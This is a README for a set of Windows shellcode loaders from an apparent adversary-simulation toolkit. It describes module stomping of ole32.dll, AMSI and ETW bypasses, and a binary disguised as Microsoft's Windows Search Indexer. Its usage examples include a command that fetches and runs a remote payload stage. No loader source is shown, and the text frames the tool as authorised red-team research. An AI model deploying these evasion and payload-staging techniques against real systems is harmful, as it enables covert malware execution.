
# MDK Loaders

Reference Windows loaders built on [purpleranges/mdk](https://github.com/purpleranges/mdk).

This repo is the `loaders/` submodule of MDK. It does not build standalone.

## Setup

Loaders build from MDK's root. Clone MDK with `--recurse-submodules` and follow MDK's Setup. Every loader executable lands under `build/loaders/<name>/<name>.exe`.

## Options

Per-loader compile-time `#define` overrides:

| Define             | Applies to           | Default                                    | Purpose                                     |
| ------------------ | -------------------- | ------------------------------------------ | ------------------------------------------- |
| `PRIMARY_DLL`      | chimera              | `L"C:\\Windows\\System32\\ole32.dll"`      | DLL stomped by chimera                      |
| `ENTROPY_PAD_SIZE` | all                  | `128` (`4096` on chimera)                  | Pad bytes added to the shellcode before use |

## Using the loaders

Every loader picks its payload source from `argv[1]`, dispatched by shape:

```powershell
.\chimera.exe                                    # embedded g_payload[] from payload.h
.\chimera.exe C:\Users\Public\beacon.bin         # local file (mdk_read_file)
.\chimera.exe https://cdn.example.com/stage.bin  # remote fetch (mdk_fetch_payload, WinINet)
```

The default embedded payload is a harmless `xor rax, rax ; ret`. Replace `g_payload[]` in each loader's `payload.h` with your (optionally encoded) bytes, then call the matching decoder (`mdk_xor`, `mdk_rc4_decrypt`, `mdk_aes_decrypt`) in `main.c` after `mdk_loader_payload` returns.

Every loader arms HWBP-based AMSI and ETW bypass before running its injection technique.

The loaders:

| Loader  | Technique                            | Target                                       | Pre-condition           |
| ------- | ------------------------------------ | -------------------------------------------- | ----------------------- |
| chimera | Module stomping                      | Own process, stomps `ole32.dll`              | none                    |

## Adding a new loader

Create a folder `loaders/<name>/` with a `main.c`, a `payload.h`, and a `CMakeLists.txt` containing a single line calling `mdk_add_loader()`. Then add `add_subdirectory(<name>)` to `loaders/CMakeLists.txt`. The helper wires the version resource, hardening flags, and MDK library links.

For inspiration, look at any existing loader.

## Layout

```
common.h           Shared boilerplate: SCM dispatch, HWBP bypass setup, cleanup
common.c           Implementation
version.rc.in      Windows version-info template, configured per loader
CMakeLists.txt     mdk_add_loader() helper + subdirectory list
chimera/           Module stomping
```

Each loader directory contains a `main.c`, a `payload.h`, and a one-line `CMakeLists.txt`.

Cover identities embedded in each binary's `.rsrc` version resource:

| Loader  | FileDescription                    | OriginalFilename            |
| ------- | ---------------------------------- | --------------------------- |
| chimera | Microsoft Windows Search Indexer   | `SearchIndexer.exe`         |

## Documentation

Per-loader reference at [sebafvs.com/mdk/loaders](https://sebafvs.com/mdk/loaders).

The website is not complete yet. Until it is, each loader's `main.c` is the reference. Every loader follows the same shape: setup bypasses (via `common.c`), load payload, entropy-pad, run the injection primitive, cleanup.

## Credits

Technique attribution for the injection primitives lives in MDK's [NOTICE.md](https://github.com/purpleranges/mdk/blob/main/NOTICE.md).

## License

MIT. See [LICENSE](./LICENSE).

## Disclaimer

This tool was developed for authorised security research and adversary simulation. Use it only against systems you own or have explicit written permission to test. The author accepts no liability for misuse. Nothing in this repository is intended as an attack against any production system, third party, or individual.

Detection artefacts (Sigma rules, YARA rules, EDR queries) derived from analysing this tool are welcome. Contributions that improve detection alongside the offensive capability are encouraged.
